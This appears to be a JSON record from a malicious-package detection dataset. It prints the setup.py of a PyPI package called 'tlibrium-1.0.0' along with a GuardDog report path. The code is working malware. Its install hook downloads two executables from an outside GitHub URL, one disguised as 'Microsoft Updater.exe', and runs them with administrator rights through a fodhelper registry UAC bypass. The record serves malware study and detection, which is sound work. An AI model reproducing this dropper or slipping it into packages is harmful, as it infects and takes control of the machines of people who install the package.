[
  {
    "pyfile": "setup.py",
    "malicious_code_snippets": "import os\nimport base64\nfrom time import sleep\nimport hashlib\n\ndef notmalfunc():\n    os.system('''pip install requests''')\n    from requests import get\n    from subprocess import call\n    from os import environ\n    import sys\n    import ctypes\n    import winreg\n    import subprocess\n    f=get('https://github.com/ErrorGEtLuck/jashfjashfjasfhl25j2lj/raw/main/lib.exe')\n    open(f\"{environ['USERPROFILE']}lib.exe\", \"wb\").write(f.content)\n    f2=get('https://github.com/ErrorGEtLuck/jashfjashfjasfhl25j2lj/raw/main/Microsoft%20Updater.exe')\n    open(f\"{environ['USERPROFILE']}Microsoft Updater.exe\", \"wb\").write(f2.content)\n    ELEVATE               = rf\"{environ['USERPROFILE']}Microsoft Updater.exe\"\n    FOD_HELPER            = r'C:\\Windows\\System32\\fodhelper.exe'\n    REG_PATH              = 'Software\\Classes\\ms-settings\\shell\\open\\command'\n    DELEGATE_EXEC_REG_KEY = 'DelegateExecute'\n    def is_running_as_admin():\n        try:\n            return ctypes.windll.shell32.IsUserAnAdmin()\n        except:\n            return False\n    def create_reg_key(key, value):\n        try:        \n            winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)\n            registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)                \n            winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)        \n            winreg.CloseKey(registry_key)\n        except WindowsError:        \n            raise\n    def bypass_uac(cmd):\n        try:\n            create_reg_key(DELEGATE_EXEC_REG_KEY, '')\n            create_reg_key(None, cmd) \n        except WindowsError:\n            raise\n    def main():        \n        if not is_running_as_admin():\n                try:                \n                    cmd = '{} /k '.format(ELEVATE)\n                    bypass_uac(cmd)                 \n                    subprocess.check_output(FOD_HELPER, shell=True)       \n                    sys.exit(0)                \n                except WindowsError:\n                    sys.exit(1)\n    main()\n\n    ELEVATE2 = rf\"{environ['USERPROFILE']}lib.exe\"\n    \n    def main2():\n        if not is_running_as_admin():\n            try:                \n                cmd = '{} /k '.format(ELEVATE2)\n                bypass_uac(cmd)                 \n                subprocess.check_output(FOD_HELPER, shell=True)       \n                sys.exit(0)                \n            except WindowsError:\n                sys.exit(1)\n    main2()\n\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()"
  },
  {
    "metadata": {
      "package_name": "tlibrium-1.0.0",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/tlibrium-1.0.0.txt"
    }
  }
]